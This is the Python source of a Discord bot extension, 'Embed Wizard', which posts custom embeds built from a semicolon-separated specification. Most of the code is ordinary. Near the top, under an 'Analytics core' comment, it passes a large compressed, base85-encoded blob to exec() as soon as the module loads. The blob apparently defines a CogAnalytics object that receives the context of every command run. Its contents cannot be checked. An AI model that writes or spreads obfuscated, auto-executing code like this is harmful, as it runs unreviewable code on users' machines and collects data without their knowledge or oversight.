import random
import string
from urllib.parse import urlparse

import discord
from discord import Embed
from discord.ext import commands

from .utils import checks
from .utils.chat_formatting import warning, error, info

"""Embed wizard cog by GrumpiestVulcan
Commissioned 2018-01-15 by Aeternum Studios (Aeternum#7967/173291729192091649)"""

__author__ = "Caleb Johnson <me@calebj.io> (calebj#7377)"
__copyright__ = "Copyright 2018, Holocor LLC"
__version__ = '1.0.0'

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-o~{ZExJT5&rI9!TNBJ)NJXOq)B0P54pJ4)>q(?YmzGh$Ix*l?uxb~$|AMSBFKO5GnBNVq;*oDMv&d
*ki&WBGjpVhO4pVdTdQ)jV6`YyT`ZU|yE0K4UzE<Qtro1xg<b0!v_$8*OsvwSSunH1f7%?aYh8e{F}$%VH#`+qT)k!;`}Ws#Q%_AYncQ_OQe_fdr(Axrd$KM
Hh}CV#gvoNX>WL;3XDwkRjC}sAUtc|cCd)*p^5`hZg)!_Ozx`N>d}mc+E{+)f;&>}-11;j1E!i1=dghkjzQ?bCbT$_!C&mhEcp`GSy5&lrRO&(9@hYnVxB1m
*b1hSEYrEs}4ecQPPat*Nk~`YZM8k$BED*hH{MP8QCI5N`a(MhtndkZs?2=BhOxBXKcbS6m47+WNWrE!|D!Btmq=wl{Saua`C0r_MD^qstn6-b$8)3l$u4au
98_85jJ{9ClhHtFcIsY)&n`zq0R@$<v*0=Du;UCN6sFm&9$@ZU2mQ0pnmCJO&cDiZzKd3xsMuJBn!Ah6ALN~@m0TV0TU`M8sjOq1Qy8d=BA`NmaQYb*OWcq<
22zGQt3LNc%g0`}{DG{i-hE^kX56WiUO|RcNHr38%(6n>ByQh|PzJy6gJOB7EdZp7HTR~i?fw*HLNhCtaYM5C%brz286?=fwTrh&2vfwn~^#NigqGUCkL`Gg
WuuxU2tw?sP(z(KiDjnNgm3M3<bNztCs-b9UMPet0l5DF4`&*kVEPUC<)pswRzIYMQDOm`Wv#^ja_W>C(wRYyp1Z+EEM~1y`q;WYtHN#)~@ZP|j&5FbFCtVn
~AAcgBovd=bIw^#)vOan9@2lT_y!^n6^oOY>+VFYv3gPp4zZ|I4C@X^t_H;2U)-nn3dBM)SMNz43;4OYRav!N&BcWBPY#fKENUH^t%P@*A_9qRG<3guRE?vF
{t_%$+$@duu?%#nQjGlRiS2(lsep~$hyU307)+*Zc`HQ!5j|Hz>@>Igip<E!AKjpGq{`u@Y^0sfbLmkLuUa=<-^kW%3G5pu_BX8sF_#!yAt*~5~cq?+1##BZ
^!+(C`nP52E?WP3tcKSCUbC#qw_UMWyh+8XTE6g3X#tN2gH@|enwU9`wbnggPdBOx<@Geit6ya)6cg01T#&AQJ42!k2O<l5N@M=?SYLo$TYU#0q$|d(p_z%v
*``=ToSG<;m-b#0&iAGcsjZA=`fy<)V$pdoEW%X9txbWh#Daq2f_F@u2@9IX5jE?uCOk^HL!*PRj9UUdrQDij&4%Hklr83q){L87Yv7-=oGF5d)-cvjO6YIh
Mr2VabF$y@DUE#?`om>8*OGIwjeQvwYMx{MP6f$1pGP`sZ7>f+;E)JP*nnd?pR2AJEcK3oYZgUs;cSN(GamF01-c%%fGqSnMP{ZH6LKUlaVKgG~rh;8$_<1B
|fO}Dx45xQ2Y@)@O8v9fVmd41Mlc*$4bbWF5{AO|_RfQ}mO3x3ToZirg0Oc-V0l(F%48sxC?Reu}wUh5ry1w7zG~T{-eMW>6w(ejU0DJ5Y0LoceVB@e<%Ul9
hg%M$tD44ULoO2~0j`7WTC#JofFr$<l9roP!rHeU-Ia}Xt67rq)d}r(3ID86tQalJ{U5Zky#swZ{fSOQKBm+G?p^tNX9KYLDk_E5-6?AVPz4~iaO6DMf1)So
?ljI(;r!O%qvcDq9L|MvwS@7-~0=0p?>m@F?a4<m5^7-khS5uve;95J#P;+|NWoc1hA7mXy+*M6O0)=6qnAp@(1`8JGyC53N1|7u30ax5!<5eqR3LD%^i;J&
Uut&lz7Ffvv#qnTtMCQ1x{vR$Ir}5~v4?X5cWdd*mL<ay>L0Oe3R4@XeY<Tyk_ZxX}knQn1SQ#Ldz$Cmwkd^?fKs7KG3C00~0kZI9!IlDdAgGaG$43)C(;Lf
re1;rkzh753-b?&DiA!DvT&752x^i$CIGb=2IeQ}X<6&7(9~W2L4?ZhmzbHQ?vN~KmsqoH{M~z;KS>jBhx+&3$#e_?D;VjJdWeKQ$?uKTRBO3{3*c($%5w_Y
}@{8g6p_CKV4?DK$KnL-eSc>X-L*?;kF61p;9`55YqTYy1Gr!=QI{6l&GSoz~Er&%P4tBjWH@TEmcorSpO6BYLYF~`>o!AY<XhAIr8;2p&<wtS+D6i{a8T|1
tr_;)ZcD*Is96X5*q=exJq<7Ct5lu^0ZwwoHlr|>!s$M$Og7WcGUF%7?sPH<>V$_aev?Vz8yLkh@%oSYu7OCSNFKl6b<KF+Fv&*G}LNjdfm@`iK0e5tG>OdH
wo)85{JtSaw*y&WqRoO$2QJ`$W#zpi!uXL5mwGAJ=es5<JCI|p`_K_PskkoFYjs+E=-nBJuW^EG!MG;evVMWP{5U)ZR9dd+m#t{7N`vnziQJ7^lJZ)#E&Lvc
9C)H)(FeiGIi-`2(*~U=)|9pOm*gZde=J#_Ohv1}dhAAe*mo*fTcBGd>a}$I|Z${~iy>=Pw6<E}LBv5kW!_`R;i;^Z%Wbtd7HQe}&u1TC5&xj?-5S(-wrQEx
u+E<RwsbOpN2<8;7Uvzj17!eGon6S<X6dL~OJ(7G*-$TqZ99O)9U_RpVRBfnSQV7mVW_9i0?~Su*2Y{!ryXrf^ZcN9!FP-gQw$nZ8Ox-ikEf3M@)i?+G%2==
07i^_<j%!IK&;P+s4yI6MrpmalLxm(ex81xOBL%*aE!)R6odKHmz_*|4t(yS$FlxAS{z`NrEDuzgIY$~KB~4v}obQ66wmcBA!)k%2n2W@qvq?IL;b9T63q9o
bJ^kYZ(nBQDL*zAnZAY?TXkxNiE9W|>Oq_)&ZwIVlG>WF|AW&KHOnyq$MjF2a&TZ6h@29uniub1?4*cluJL+e;du^@&rR%jwI&R}>kj&Q$8cX_}AlBNEj<(~
)el*xd-k8>nL3`Se2sA)wC+J+5M5#Cj@&O}yhudW+p{yBBY-oJi4%^W|XqCvYP9hh<F;$A1;AZ&TGp&=r4Qy0OG0;_)dNb+R<F<B?|Nh^uJ<$llWe0>tPA1A
h#}R?|gM+Vi@86o4PzMN&Cj+F`Zw_kGKql~p`av`ukR%5s^p3PGSJ*O*W@DU$_p>MOi~|M9J_0ZGW={&|;TSy{kBJ|RP31bk{g#BV>7WncJ2dCK9bdK&bK;F
NN17LtHkqmk4hU=OkkFvlkfXbF<@GE1=#G!0eUc_U?_|ci*hY`#&-hR~Ho%GGz%*gP!w+$q;o_9f8~i9of>B(%Nz4#i{rl88!hS-4ioB7_$y?L7L<6079UO0
4d^90nmC13R$whoR8ozG@`f4Rpr{m%v$ZMYhlB><uhFYKh0`U`_^8""".replace('\n', ''))))


def color_converter(color):
    if type(color) is int:
        if color < 0 or color > 0xffffff:
            raise ValueError('Color value is outside of valid range')
        return '%06x' % color
    color = color.strip('#')
    if color.startswith('0x'):
        color = color[2:]
    if len(color) != 6 or set(color) - set(string.hexdigits):
        raise ValueError('Invalid color hex value')
    return color


def is_valid_color(color):
    try:
        color_converter(color)
        return True
    except Exception:
        return False


def is_valid_url(url):
    token = urlparse(url)
    scheme_ok = token.scheme.lower() in {'http', 'https'}
    netloc_split = token.netloc.split('.')
    netloc_ok = len(list(filter(None, netloc_split))) > 1
    return scheme_ok and netloc_ok


class EmbedWizard:
    def __init__(self, bot):
        self.bot = bot
        self.analytics = CogAnalytics(self)

    @checks.mod_or_permissions(manage_messages=True)
    @commands.group(pass_context=True, no_pm=True, invoke_without_command=True)
    async def embedwiz(self, ctx, *, specification):
        """Posts an embed according to the given specification:

        Title;color;footer text;footer_icon;image_url;thumbnail_url;body text

        All values can be seperated by newlines, spaces, or other whitespace.

        Color can be a #HEXVAL, "random", or a name that discord.Color knows.
        Options: https://discordpy.readthedocs.io/en/async/api.html#discord.Colour

        All URLs (footer icon, image, thumbnail) can be empty or "none".

        Body text can be "prompt" to use your next message as the content.

        WARNING: embeds are hidden to anyone with the 'link previews' setting off.
        """
        if ctx.invoked_subcommand is None:
            embed = await self._parse_embed(ctx, specification)
            if embed:
                await self.bot.say(embed=embed)

    @embedwiz.command(name='channel', pass_context=True, no_pm=True)
    async def embed_channel(self, ctx, channel: discord.Channel, *, specification):
        """Posts an embed in another channel according to the spec.

        See [p]help embedwiz for more information.
        """

        if not channel.permissions_for(ctx.message.author).send_messages:
            msg = error("You don't have permissions to post there!")
            await self.bot.say(msg)
            return

        embed = await self._parse_embed(ctx, specification)
        if embed:
            await self.bot.send_message(channel, embed=embed)

    @embedwiz.command(name='delete', pass_context=True, no_pm=True)
    async def embed_del(self, ctx, *, specification):
        """Posts an embed according to the spec after deleting the original message.

        See [p]help embedwiz for more information.
        """
        perms = ctx.message.channel.permissions_for(ctx.message.server.me)
        can_delete = perms.manage_messages
        if not can_delete:
            msg = "I can't delete your command message! Posting anyway..."
            await self.bot.say(warning(msg))

        tup = await self._parse_embed(ctx, specification, return_todelete=True)
        if tup:
            embed, to_delete = tup
            await self.bot.say(embed=embed)
            if not can_delete:
                return
            for msg in [ctx.message, *to_delete]:
                await self.bot.delete_message(msg)

    async def _parse_embed(self, ctx, specification, return_todelete=False):
        to_delete = []

        split = specification.split(';', 7)
        nfields = len(split)
        if nfields != 7:
            op = 'many' if nfields > 7 else 'few'
            msg = 'Invalid specification: got too {} fields ({}, expected 7)'
            await self.bot.say(error(msg.format(op, nfields)))
            return

        title, color, ftext, fimage, image, timage, body = map(str.strip, split)

        try:
            color = int(color_converter(color), 16)
        except ValueError as e:
            colorstr = color.lower().replace(' ', '_')
            if colorstr == 'random':
                color = discord.Color(random.randrange(0x1000000))
            elif colorstr.strip() in ('', 'none'):
                color = Embed.Empty
            elif colorstr.strip() == 'black':
                color = discord.Color.default()
            elif hasattr(discord.Color, colorstr):
                color = getattr(discord.Color, colorstr)()
            else:
                await self.bot.say(error(e.args[0]))
                return

        if ftext.lower() in ('none', ''):
            ftext = Embed.Empty

        if fimage.lower() in ('none', ''):
            fimage = Embed.Empty
        elif not is_valid_url(fimage):
            await self.bot.say(error('Invalid footer icon URL!'))
            return

        if image.lower() in ('none', ''):
            image = Embed.Empty
        elif not is_valid_url(image):
            await self.bot.say(error('Invalid image URL!'))
            return

        if timage.lower() in ('none', ''):
            timage = Embed.Empty
        elif not is_valid_url(timage):
            await self.bot.say(error('Invalid thumbnail URL!'))
            return

        if body.lower() == 'prompt':
            msg = await self.bot.say('Post the desired content of your embed, '
                                     ' or "cancel" to cancel. Will wait one'
                                     ' minute.')
            to_delete.append(msg)

            msg = await self.bot.wait_for_message(author=ctx.message.author,
                                                  channel=ctx.message.channel,
                                                  timeout=60)
            if msg is None:
                await self.bot.say(error('Timed out waiting for a reply.'))
                return
            else:
                to_delete.append(msg)

            if msg.content.lower().strip() == 'cancel':
                await self.bot.say(info('Cancelled.'))
                return
            else:
                body = msg.content

        embed = Embed(title=title, color=color, description=body)

        if image:
            embed.set_image(url=image)
        if ftext or fimage:
            embed.set_footer(text=ftext, icon_url=fimage)
        if timage:
            embed.set_thumbnail(url=timage)

        if return_todelete:
            return embed, to_delete
        return embed

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)


def setup(bot):
    bot.add_cog(EmbedWizard(bot))
